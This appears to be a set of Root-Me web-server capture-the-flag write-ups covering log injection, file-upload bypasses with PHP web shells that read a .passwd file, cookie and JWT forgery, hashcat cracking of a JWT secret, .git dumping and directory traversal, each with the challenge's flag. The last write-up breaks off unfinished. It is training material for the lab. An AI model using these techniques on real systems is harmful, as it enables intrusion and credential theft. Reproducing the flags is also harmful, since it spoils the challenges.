- Date: 31 July 2011
- Points: 20
- Level: 2

### Statement

Inject false data in the journalisation log.

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch14/).

### Resources

1. [RFC 2616](https://repository.root-me.org/RFC/EN%20-%20rfc2616.txt).
2. [HTTP request smuggling](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20HTTP%20request%20smuggling.pdf).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We find a login page with an authentication log that is reflected in the URL.  For example, entering user = admin, password = admin, we get the URL:

~~~
ch14/?username=admin&password=admin
~~~

Following the title, we can inject carriage returns and line feeds using URL encoded characters: 

~~~
\r = %0D 
\n = %0A
~~~

We can use these to inject an authentication message which returns the flag:

~~~
ch14/?username=admin%20authenticated.%0D%0Atest&password=test
~~~

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
rFSP&G0p&5uAg1%
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## File Upload Double extensions

- Author: g0uZ
- Date: 24 December 2012
- Points: 20
- Level: 2

### Statement

Your goal is to hack this photo gallery by uploading PHP code.
Retrieve the validation password in the file .passwd at the root of the application.

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch20/).

### Resources

1. [Secure file upload in PHP web applications](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Secure%20file%20upload%20in%20PHP%20web%20applications.pdf).

### Solutions

<details>

<summary markdown="span">Solution</summary>

We find a gallery webpage. Trying to access /.passwd we get a forbidden response. 

We can find an upload form for uploading new content, the new images are stored in galerie/upload/filehash/image.png. Let's try a simple php file:

~~~php
<?php
  $flag = shell_exec('strings ../../../.passwd');
  echo "<pre>$flag</pre>";
?>
~~~

We can call this "real_image.php.png" and upload.  When we navigate to the image, we get the flag.

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
Gg9LRz-hWSxqqUKd77-_q-6G8
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---
	
## File Upload MIME type

- Author: g0uZ
- Date: 26 December 2012
- Points: 20
- Level: 2

### Statement

Your goal is to hack this photo galery by uploading PHP code.
Retrieve the validation password in the file .passwd.

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch21/).

### Resources

1. [Secure file upload in PHP web applications](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Secure%20file%20upload%20in%20PHP%20web%20applications.pdf).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We find an image gallery with image upload form.  We can test the image upload and see a MIME formatted POST request.

Header:

~~~
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------3162911777502860060858434462
Content-Length: 49444
Origin: http://challenge01.root-me.org
DNT: 1
Connection: keep-alive
Referer: http://challenge01.root-me.org/web-serveur/ch21/?action=upload
Cookie: PHPSESSID=10df48b1320c55e7f8560e6b846d6303; _ga_SRYSKX09J7=GS1.1.1642856008.3.0.1642856008.0; _ga=GA1.1.1548291302.1642841282
Upgrade-Insecure-Requests: 1
~~~

Body:

~~~
-----------------------------3162911777502860060858434462
Content-Disposition: form-data; name="file"; filename="newpic.jpg"
Content-Type: image/jpeg

####

-----------------------------3162911777502860060858434462--
~~~

We can create a php script to show the passwd (saved as giveflag.php):

~~~php
<?php
$output = shell_exec('cat ../../../.passwd');
echo "<pre>$output</pre>";
?>
~~~

We can try to submit and get a rejection "wrong file type":

Header:

~~~
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------4443321272302534311005483800
Content-Length: 309
Origin: http://challenge01.root-me.org
DNT: 1
Connection: keep-alive
Referer: http://challenge01.root-me.org/web-serveur/ch21/?action=upload
Cookie: PHPSESSID=10df48b1320c55e7f8560e6b846d6303; _ga_SRYSKX09J7=GS1.1.1642856008.3.0.1642856008.0; _ga=GA1.1.1548291302.1642841282
Upgrade-Insecure-Requests: 1
~~~

Body:

~~~
-----------------------------4443321272302534311005483800
Content-Disposition: form-data; name="file"; filename="giveflag.php"
Content-Type: application/x-php

<?php
$output = shell_exec('cat ../../../.passwd');
echo "<pre>$output</pre>";
?>

-----------------------------4443321272302534311005483800--
~~~

Changing the body to label the file as a jpeg, we can resubmit:

~~~
-----------------------------4443321272302534311005483800
Content-Disposition: form-data; name="file"; filename="giveflag.php"
Content-Type: image/jpeg

<?php
$output = shell_exec('cat ../../../.passwd');
echo "<pre>$output</pre>";
?>

-----------------------------4443321272302534311005483800--
~~~

Navigating to the file, we get the password!

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
a7n4nizpgQgnPERy89uanf6T4
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## HTTP Cookies

- Author: g0uZ
- Date: 7 October 2006
- Points: 20
- Level: 2

### Statement

PS: Bob really love cookies!

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch7/).

### Resources

1. [RFC 2109](https://repository.root-me.org/RFC/EN%20-%20rfc2109.txt).
2. [HTTPS Cookie Stealing](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20HTTPS%20Cookie%20Stealing.pdf).
3. [Cookies, sessions and persistence](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Cookies,%20sessions,%20and%20persistence.pdf).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Using CURL, we can retrieve the cookies used on the site:

~~~shell
$ curl -c - "http://challenge01.root-me.org/web-serveur/ch7/"
...
form method="POST" action="" name="a"
...
SetCookie("ch7","visiteur")
...
a href="?c=visiteur"
...
~~~

We can see the cookie "ch7" is set to visiteur, we can set this to admin and we need to change the form to admin:

~~~shell
$ curl --cookie "ch7=admin" "http://challenge01.root-me.org/web-serveur/ch7/?c=admin"
...
Validation password : ml-SYMPA
...
~~~

This gives us the password.

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
ml-SYMPA
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## Insecure Code Management

- Author: Swissky
- Date: 29 September 2019
- Points: 20
- Level: 2

### Statement

Get the password (in clear text) from the admin account.

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch61/).

### Resources

1. [documentation](https://git-scm.com/documentation).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

This challenge suggests the website is a git host.  We can find /.git shows us the site directory.  This can be downloaded using the [gitdumper.sh](https://github.com/internetwache/GitTools/blob/master/Dumper/gitdumper.sh) tool:

~~~shell
$ gitdumper.sh http://challenge01.root-me.org/web-serveur/ch61/.git/ new
~~~

Using git, we can look at the files in the archive:

~~~shell
$ git checkout --
D	config.php
D	css/style.css
D	image/background.jpg
D	image/logo.png
D	index.php
~~~

We can also review logs:

~~~shell
$ git log
commit c0b4661c888bd1ca0f12a3c080e4d2597382277b (HEAD -> master)
Author: John <john@bs-corp.com>
Date:   Fri Sep 27 20:10:05 2019 +0200

    blue team want sha256!!!!!!!!!

commit 550880c40814a9d0c39ad3485f7620b1dbce0de8
Author: John <john@bs-corp.com>
Date:   Mon Sep 23 15:10:07 2019 +0200

    renamed app name

commit a8673b295eca6a4fa820706d5f809f1a8b49fcba
Author: John <john@bs-corp.com>
Date:   Sun Sep 22 12:38:32 2019 +0200

    changed password

commit 1572c85d624a10be0aa7b995289359cc4c0d53da
Author: John <john@bs-corp.com>
Date:   Thu Sep 12 11:10:06 2019 +0200

    secure auth with md5

commit 5e0e146e2242cb3e4b836184b688a4e8c0e2cc32
Author: John <john@bs-corp.com>
Date:   Thu Sep 5 11:10:15 2019 +0200

    Initial commit for the new HR database access
~~~

We can see the password was changed.  Inflating the archive files, we can review the php files:

~~~shell
$ git checkout -- .
$ ls
config.php  css  image  index.php
$ cat config.php
<?php
	$username = "admin";
	$password = "0c25a741349bfdcc1e579c8cd4a931fca66bdb49b9f042c4d92ae1bfa3176d8c";
~~~

This is the sha256 hash of the password.  Using an [online unhasing tool]() we can retrieve the PT password.

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
s3cureP@ssw0rd
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## JSON Web Token JWT Introduction

- Author: Kn0wledge
- Date: 21 August 2019
- Points: 20
- Level: 2

### Statement

To validate the challenge, connect as admin.

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch58/).

### Resources

1. [https://jwt.io/](https://jwt.io/).
2. [RFC 7519](https://repository.root-me.org/RFC/EN%20-%20rfc7519.txt).
3. [Attacking JWT Authentication](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Attacking%20JWT%20authentication%20-%20Sjoerd%20Langkemper.pdf).
4. [Hacking JSON Web Token](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Hacking%20JSON%20Web%20Token%20(JWT)%20-%20Rudra%20Pratap.pdf).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can visit the website and view the source code:

~~~html
<html>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>

    <div class="panel">
      <form method="post" action="index.php">
        <h1>Login Form</h1>
        <input type="text" name="username" placeholder=" Username" class="input" />
        <input type="password" name="password" placeholder=" Password"  class="input" />
        <button type="submit" class="btn">Sign In</button>
      </form>
      <p>You don't have an account? <a href="index.php?guest" style="color:#f1c40f;">Login as Guest!</a></p>
    </div>
  </body>
</html>
~~~

We can see a form with username and password.  There is a link to the index.php authenticated using "guest".  Visiting this site we find cookie:

~~~shell
jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk
~~~

We can use an [online JWT decoder](https://www.jstoolset.com/jwt) to view the contents of the cookie or decompile in Python:

~~~py
import jwt

encoded_jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk"
decoded_jwt = jwt.decode(encoded_jwt, options={"verify_signature": False})

print(decoded_jwt)
~~~

returns:

~~~
{'username': 'guest'}
~~~

This shows us the cookie contains the field "username" set to guest.  Let's change this to admin, we can first deconstruct the jwt cookie:

~~~py
import base64 as b64
base64_jwt = encoded_jwt.split(".")
bytes_jwt_1 = b64.b64decode(base64_jwt[0])
bytes_jwt_2 = b64.b64decode(base64_jwt[1]+"=")
hex_jwt_1 = bytes_jwt_1.hex()
hex_jwt_2 = bytes_jwt_2.hex()
bytes_jwt_3 = b64.urlsafe_b64decode(base64_jwt[2]+"==")
hex_jwt_3 = bytes_jwt_3.hex()

print(bytes_jwt_1.decode())
print(bytes_jwt_2.decode())
~~~

returns:

~~~
{"typ":"JWT","alg":"HS256"}
{"username":"guest"}
~~~

This shows the encryption algorithm is HS256.  We can generate a new jwt removing the signature and changing the username:

~~~py
new_jwt_1 = '{"typ":"JWT","alg":"none"}'.encode()
new_jwt_2 = '{"username":"admin"}'.encode()
hex_new_jwt_1 = binascii.hexlify(new_jwt_1)
b64_new_jwt_1 = b64.b64encode(new_jwt_1).decode()
hex_new_jwt_2 = binascii.hexlify(new_jwt_2)
b64_new_jwt_2 = b64.b64encode(new_jwt_2).decode()

new_jwt = (b64_new_jwt_1+"." + b64_new_jwt_2+".")
~~~

This gives us a replacement JWT cookie:

~~~
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIn0=.
~~~

Entering this into the cookie on the guest page takes us to the admin page and gives us the answer!

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7 
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## Directory traversal

- Author: g0uZ
- Date: 31 July 2011
- Points: 25
- Level: 3

### Statement

Find the hidden section of the photo galery.

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch15/ch15.php).

### Resources

1. [A Case of Directory Traversal](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20A%20Case%20of%20directory%20traversal.pdf).
2. [BlackHat US 2011 DotDotPwn directory traversal fuzzer](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20BlackHat%20US%202011%20DotDotPwn%20directory%20traversal%20fuzzer.pdf).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can visit the website and view the source code:

~~~html
<html>

<body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
    <h1>Photo gallery v 0.01</h1><span id="mnenu" />&nbsp;|&nbsp;<span><a href="?galerie=emotes">emotes</a></span>&nbsp;|&nbsp;<span><a href="?galerie=apps"><b>apps</b></a></span>&nbsp;|&nbsp;<span><a href="?galerie=devices">devices</a></span>&nbsp;|&nbsp;<span><a href="?galerie=categories">categories</a></span>&nbsp;|&nbsp;<span><a href="?galerie=actions">actions</a></span>&nbsp;|</span><span style='text-align: right; float:right;'>Connected as : <b>guest</b></span><br/>
    <hr/>
    <table id="content">
        <tr>
            <td><img width="64px" height="64px" src="galerie/apps/preferences-desktop-screensaver.png" alt="preferences-desktop-screensaver.png"></td>
        </tr>
        <tr>
            <td><img width="64px" height="64px" src="galerie/apps/krita.png" alt="krita.png"></td>
            <td><img width="64px" height="64px" src="galerie/apps/graphics-viewer-document.png" alt="graphics-viewer-document.png"></td>
            <td><img width="64px" height="64px" src="galerie/apps/kexi.png" alt="kexi.png"></td>
        </tr>
        <tr>
            <td><img width="64px" height="64px" src="galerie/apps/kthesaurus.png" alt="kthesaurus.png"></td>
            <td><img width="64px" height="64px" src="galerie/apps/plasmagik.png" alt="plasmagik.png"></td>
            <td><img width="64px" height="64px" src="galerie/apps/showfoto.png" alt="showfoto.png"></td>
            <td><img width="64px" height="64px" src="galerie/apps/utilities-terminal.png" alt="utilities-terminal.png"></td>
        </tr>
        <tr>
            <td><img width="64px" height="64px" src="galerie/apps/preferences-desktop-user-password.png" alt="preferences-desktop-user-password.png"></td>
        </tr>
    </table>
</body>

</html>
~~~

Changing galleries, we can see the URL changes:

~~~
http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=emotes
http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=apps
http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=devices
http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=categories
http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=actions
~~~

We can refer the root to the php and see what is returned:

~~~
http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=./
~~~

~~~html
<html>

<body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
    <h1>Photo gallery v 0.01</h1><span id="mnenu" />&nbsp;|&nbsp;<span><a href="?galerie=emotes">emotes</a></span>&nbsp;|&nbsp;<span><a href="?galerie=apps">apps</a></span>&nbsp;|&nbsp;<span><a href="?galerie=devices">devices</a></span>&nbsp;|&nbsp;<span><a href="?galerie=categories">categories</a></span>&nbsp;|&nbsp;<span><a href="?galerie=actions">actions</a></span>&nbsp;|</span><span style='text-align: right; float:right;'>Connected as : <b>guest</b></span><br/>
    <hr/>
    <table id="content">
        <tr>
            <td><img width="64px" height="64px" src="galerie/.//86hwnX2r" alt="86hwnX2r"></td>
        </tr>
        <tr>
            <td><img width="64px" height="64px" src="galerie/.//emotes" alt="emotes"></td>
            <td><img width="64px" height="64px" src="galerie/.//apps" alt="apps"></td>
            <td><img width="64px" height="64px" src="galerie/.//devices" alt="devices"></td>
        </tr>
        <tr>
            <td><img width="64px" height="64px" src="galerie/.//categories" alt="categories"></td>
            <td><img width="64px" height="64px" src="galerie/.//actions" alt="actions"></td>
        </tr>
    </table>
</body>

</html>
~~~

The hidden gallery is 86hwnX2r...

~~~
http://challenge01.root-me.org/web-serveur/ch15/ch15.php?86hwnX2r
~~~

This gives us the hidden gallery:

~~~html
<html>

<body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
    <h1>Photo gallery v 0.01</h1><span id="mnenu" />&nbsp;|&nbsp;<span><a href="?galerie=emotes">emotes</a></span>&nbsp;|&nbsp;<span><a href="?galerie=apps">apps</a></span>&nbsp;|&nbsp;<span><a href="?galerie=devices">devices</a></span>&nbsp;|&nbsp;<span><a href="?galerie=categories">categories</a></span>&nbsp;|&nbsp;<span><a href="?galerie=actions">actions</a></span>&nbsp;|</span><span style='text-align: right; float:right;'>Connected as : <b>guest</b></span><br/>
    <hr/>
    <table id="content">
        <tr></tr>
        <tr>
            <td><img width="64px" height="64px" src="galerie/86hwnX2r/password.txt" alt="password.txt"></td>
            <td><img width="64px" height="64px" src="galerie/86hwnX2r/hacked_web.jpg" alt="hacked_web.jpg"></td>
            <td><img width="64px" height="64px" src="galerie/86hwnX2r/secret.png" alt="secret.png"></td>
        </tr>
        <tr></tr>
    </table>
</body>

</html>
~~~

We can see the password.txt file; opening this gives us the solution.

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
kcb$!Bx@v4Gs9Ez 
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---


## File upload Null byte

- Author: g0uZ
- Date: 26 December 2012
- Points: 25
- Level: 3

### Statement

Your goal is to hack this photo galery by uploading PHP code.

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch22/).

### Resources

1. [Secure file upload in PHP web applications](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Secure%20file%20upload%20in%20PHP%20web%20applications.pdf).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can visit the website and see a gallery upload form.  We can write a test php file and upload:

~~~php
<?php
  echo("Where is the flag?")
?>
~~~

Uploading the php we get a Wrong file type! message.  Adding a .jpg to the filename, we can upload but get an error Wrong file name!.

As hinted at in the challenge, we can put a null byte into the filename to bypass this check; whereistheflag.php%00.jpg.

Uploading, we are succesful and get a URL of our file: ./galerie/upload/efc75820c86baf40292f4e959f5c4c1f/wherestheflag.php%00.jpg

This page returns a 400 error, however removing the null byte and jpg, we can get the php code (./galerie/upload/efc75820c86baf40292f4e959f5c4c1f/wherestheflag.php), which provides the solution.

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
YPNchi2NmTwygr2dgCCF
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---


## JSON Web Token JWT Weak secret

- Author: Jrmbt
- Date: 21 August 2019
- Points: 25
- Level: 3

### Statement

This API with its /hello endpoint (accessible with GET) seems rather welcoming at first glance but is actually trying to play a trick on you.

Manage to recover its most valuable secrets!

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch59/).

### Resources

1. [https://jwt.io/](https://jwt.io/).
2. [RFC 7519](https://repository.root-me.org/RFC/EN%20-%20rfc7519.txt).
3. [Attacking JWT Authentication](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Attacking%20JWT%20authentication%20-%20Sjoerd%20Langkemper.pdf).
4. [Hacking JSON Web Token](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Hacking%20JSON%20Web%20Token%20(JWT)%20-%20Rudra%20Pratap.pdf).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can visit the website and navigate to http://challenge01.root-me.org/web-serveur/ch59/token to get the JWT:

~~~
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw
~~~

Decompiling in Python:

~~~py
import jwt
import binascii

encoded_jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw"
decoded_jwt = jwt.decode(encoded_jwt, options={"verify_signature": False})

print(decoded_jwt)

import base64 as b64
base64_jwt = encoded_jwt.split(".")
bytes_jwt_1 = b64.b64decode(base64_jwt[0])
bytes_jwt_2 = b64.b64decode(base64_jwt[1]+"==")
hex_jwt_1 = bytes_jwt_1.hex()
hex_jwt_2 = bytes_jwt_2.hex()
bytes_jwt_3 = b64.urlsafe_b64decode(base64_jwt[2]+"==")
hex_jwt_3 = bytes_jwt_3.hex()


print(bytes_jwt_1.decode())
print(bytes_jwt_2.decode())
~~~

We get:

~~~
{'role': 'guest'}
{"typ":"JWT","alg":"HS512"}
{"role":"guest"}
~~~

We can see the signature is hashed with HMAC+SHA512.  Let's try and find the secret key:

We can save the JWT in a file encrypted_jwt.john:

~~~
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw
~~~

Using a dictionary attack with hashcat we can find the key:

~~~shell
$ hashcat -m 16500 encrypted_jwt.john -o cracked.txt rockyou.txt 
~~~

This provides the key: "lol".

We can now generate a new key in Python:

~~~py
new_jwt = jwt.encode({"role": "admin"},"lol",algorithm="HS512")
print(new_jwt)
~~~

This provides a new token:

~~~
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4ifQ.y9GHxQbH70x_S8F_VPAjra_S-nQ9MsRnuvwWFGoIyKXKk8xCcMpYljN190KcV1qV6qLFTNrvg4Gwyv29OCjAWA
~~~

We can submit this as a POST request as described on the homepage using curl:

~~~shell
$ curl -X POST http://challenge01.root-me.org/web-serveur/ch59/admin -d "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4ifQ.y9GHxQbH70x_S8F_VPAjra_S-nQ9MsRnuvwWFGoIyKXKk8xCcMpYljN190KcV1qV6qLFTNrvg4Gwyv29OCjAWA"
{"message": "method to authenticate is: 'Authorization: Bearer YOURTOKEN'"}
~~~

We can see the site is asking for us to use this as a Bearer authentication token in the header, retrying:

~~~shell
$ curl -X POST http://challenge01.root-me.org/web-serveur/ch59/admin -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4ifQ.y9GHxQbH70x_S8F_VPAjra_S-nQ9MsRnuvwWFGoIyKXKk8xCcMpYljN190KcV1qV6qLFTNrvg4Gwyv29OCjAWA"
~~~

This gives the solution.

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
PleaseUseAStrongSecretNextTime
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## JWT Revoked token

- Author: ArnC
- Date: 20 March 2020
- Points: 25
- Level: 3

### Statement

Two endpoints are available :

- POST : /web-serveur/ch63/login
- GET : /web-serveur/ch63/admin

Get an access to the admin endpoint.

<details>

<summary markdown="span">Source Code</summary>

~~~py
    #!/usr/bin/env python3
    # -*- coding: utf-8 -*-
    from flask import Flask, request, jsonify
    from flask_jwt_extended import JWTManager, jwt_required, create_access_token, decode_token
    import datetime
    from apscheduler.schedulers.background import BackgroundScheduler
    import threading
    import jwt
    from config import *
     
    # Setup flask
    app = Flask(__name__)
     
    app.config['JWT_SECRET_KEY'] = SECRET
    jwtmanager = JWTManager(app)
    blacklist = set()
    lock = threading.Lock()
     
    # Free memory from expired tokens, as they are no longer useful
    def delete_expired_tokens():
        with lock:
            to_remove = set()
            global blacklist
            for access_token in blacklist:
                try:
                    jwt.decode(access_token, app.config['JWT_SECRET_KEY'],algorithm='HS256')
                except:
                    to_remove.add(access_token)
           
            blacklist = blacklist.difference(to_remove)
     
    @app.route("/web-serveur/ch63/")
    def index():
        return "POST : /web-serveur/ch63/login <br>\nGET : /web-serveur/ch63/admin"
     
    # Standard login endpoint
    @app.route('/web-serveur/ch63/login', methods=['POST'])
    def login():
        try:
            username = request.json.get('username', None)
            password = request.json.get('password', None)
        except:
            return jsonify({"msg":"""Bad request. Submit your login / pass as {"username":"admin","password":"admin"}"""}), 400
     
        if username != 'admin' or password != 'admin':
            return jsonify({"msg": "Bad username or password"}), 401
     
        access_token = create_access_token(identity=username,expires_delta=datetime.timedelta(minutes=3))
        ret = {
            'access_token': access_token,
        }
       
        with lock:
            blacklist.add(access_token)
     
        return jsonify(ret), 200
     
    # Standard admin endpoint
    @app.route('/web-serveur/ch63/admin', methods=['GET'])
    @jwt_required
    def protected():
        access_token = request.headers.get("Authorization").split()[1]
        with lock:
            if access_token in blacklist:
                return jsonify({"msg":"Token is revoked"})
            else:
                return jsonify({'Congratzzzz!!!_flag:': FLAG})
     
     
    if __name__ == '__main__':
        scheduler = BackgroundScheduler()
        job = scheduler.add_job(delete_expired_tokens, 'interval', seconds=10)
        scheduler.start()
        app.run(debug=False, host='0.0.0.0', port=5000)

~~~

</details>

### Resources

1. [Attacking JWT Authentication](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Attacking%20JWT%20authentication%20-%20Sjoerd%20Langkemper.pdf).
2. [Hacking JSON Web Token](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Hacking%20JSON%20Web%20Token%20(JWT)%20-%20Rudra%20Pratap.pdf).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can initialise requests in python using the requests library:

~~~py
import requests
URL = "http://challenge01.root-me.org/web-serveur/ch63/"
login_page = "login"
admin_page = "admin"

username = "admin"
password = "admin"

login_data = {"username":username, "password": password}

login_r = requests.post(URL+login_page, json = login_data)
access_token = "0"
admin_header = {'Authorization': "Bearer "+access_token}
admin_r = requests.get(URL+admin_page,headers = admin_header)
print(admin_r.content)
~~~

This provides a route for us to record the JWT:

~~~py
login_r = requests.post(URL+login_page, json = login_data
access_token = login_r.content.decode().split(":")[1][1:-3]
~~~

Resubmitting this token, we get a rejection since this is in the blacklist as detailed in the source code.  We need to change the authentication token whilst maintaining the signature.  Appending "=" does not work since the signature does not match.  A peculiarity with base64 is "_" and "/" will be decompiled to the same value.  We can use this to find a JWT that includes a "_" and change it to a "/".  This will bypass the blacklist filter and maintain the JWT signature:

~~~py
import requests

URL = "http://challenge01.root-me.org/web-serveur/ch63/"
login_page = "login"
admin_page = "admin"

username = "admin"
password = "admin"

login_data = {"username":username, "password": password}

underscore = False

while underscore == False:
    login_r = requests.post(URL+login_page, json = login_data)
    access_token = login_r.content.decode().split(":")[1][1:-3]
    if "_" in access_token:
        access_token = access_token.split("_")
        access_token = "/".join(access_token)
        underscore = True
    
admin_header = {'Authorization': "Bearer "+access_token}
admin_r = requests.get(URL+admin_page,headers = admin_header)
print(admin_r.content)
~~~

This gives the solution.

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
Do_n0t_r3v0ke_3nc0d3dTokenz_Mam3ne-Us3_th3_JTI_f1eld
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---	

## PHP assert

- Author: Birdy42
- Date: 26 November 2016
- Points: 25
- Level: 3

### Statement

Find and exploit the vulnerability to read the file .passwd.

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch47/).

### Resources

1. [Exploiting LFI using co hosted web applications](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Exploiting%20LFI%20using%20co%20hosted%20web%20applications.pdf).
2. [Source code auditing algorithm for detecting LFI and RFI](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Source%20code%20auditing%20algorithm%20for%20detecting%20LFI%20and%20RFI.pdf).
3. [LFI with phpinfo() assistance](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20LFI%20with%20phpinfo()%20assistance.pdf).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can see the site source code:

~~~html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Evilness is words to live by.</title>
  </head>
 <body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
    <div>
      <a href="?page=home">Home</a> |
      <a href="?page=about">About</a> |
      <a href="?page=contact">Contact</a>
    </div>
    <hr style="margin-bottom:30px;">
    <div>
      You will never find out where our secrets are located... ahahaha (Evil laugh)
    </div>

  </body>
</html>
~~~

